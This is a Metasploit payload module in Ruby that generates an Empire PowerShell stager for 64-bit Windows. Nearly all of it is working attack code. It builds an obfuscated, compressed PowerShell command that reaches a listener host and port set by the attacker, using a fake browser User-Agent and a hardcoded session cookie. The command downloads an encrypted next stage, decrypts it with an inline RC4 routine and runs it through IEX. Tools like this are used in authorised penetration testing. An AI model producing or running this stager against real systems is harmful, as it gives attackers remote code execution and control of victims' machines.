##
# This module requires Metasploit: https://metasploit.com/download
##

require 'msf/core/payload/windows/exec_x64'
require 'msf/core/payload/windows/powershell'
require 'msf/base/sessions/powershell'
require 'msf/core/handler/reverse_tcp_ssl'

###
#
# Empire stager payload.
#
###
module MetasploitModule

  CachedSize = 866

  include Msf::Payload::Windows::Exec_x64
  include Msf::Payload::Windows::Powershell
  include Rex::Powershell::Command

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Empire Powershell launcher',
      'Description'   => 'Gererate an Empire PowerShell custom stager',
      'Author'        => '\@b4rtic',
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X64
      ))

    # Register command execution options
    register_options(
      [
        OptString.new('STAGINGKEY', [ true, "StagingKey of Empire listner", nil ]),
        OptAddress.new('LHOST', [ true, "Host of Empire listner", nil ]),
        OptPort.new('LPORT', [ true, "Port of Empire listner", nil ]),
        OptBool.new('SSL', [ true, "Enable ssl for Empire Stager", false ])
      ])
    # Hide the CMD option...this is kinda ugly
    deregister_options('CMD')
    deregister_options('EXITFUNC')

  end

  #
  # Override the exec command string
  #
  def powershell_command

    lport = datastore['LPORT']
    lhost = datastore['LHOST']
    stagingkey = datastore['STAGINGKEY']
    ssl = datastore['SSL']
    protocol = "http"

    if ssl == true
      protocol = "https"
    end

    data = %Q|[SyStEm.NEt.SERvIcEPoinTMAnagER]::ExpecT100ConTInue=0;
$Wc=NEW-ObjeCT SYsTEM.Net.WEbClIeNT;
$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$WC.HEADeRs.AdD('User-Agent',$u);
$Wc.PROXY=[SYstem.NeT.WeBReQUEST]::DefAulTWebPROxY;
$WC.PROxy.CreDEnTiaLs = [SySTem.NeT.CrEDENtIAlCacHe]::DEFAULTNetWorkCREDEnTIaLs;
$Script:Proxy = $wc.Proxy;
$K=[SySTEM.Text.EnCOdiNG]::ASCII.GeTBYtEs('#{stagingkey}');
$R={$D,$K=$ArGs;$S=0..255;0..255\|%{$J=($J+$S[$_]+$K[$_%$K.CouNt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D\|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BXoR$S[($S[$I]+$S[$H])%256]}};
$ser='#{protocol}://#{lhost}:#{lport}';
$t='/login/process.php';
$Wc.HeadErS.AdD("Cookie","session=qK4NYavCKimkBJLDHITxGU1M7bw=");
$dATa=$WC.DOWnLOAdDATa($sEr+$T);
$Iv=$DaTa[0..3];
$dATA=$dAtA[4..$DaTa.LEngTh];
-JoIN[ChaR[]](& $R $Data ($IV+$K))\|IEX
    |

     script = Rex::Powershell::Command.compress_script(data)
    return "[psh]#{script}[psh]"
  end
end